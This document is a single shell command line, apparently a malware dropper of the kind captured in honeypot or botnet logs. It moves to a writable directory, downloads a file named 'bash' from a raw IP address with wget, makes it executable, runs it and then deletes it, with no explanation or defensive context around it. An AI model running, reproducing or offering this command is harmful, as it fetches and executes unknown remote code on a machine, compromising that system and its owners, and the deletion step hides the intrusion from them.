cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.9.77.253/bash; chmod +x bash; ./bash; rm -rf bash
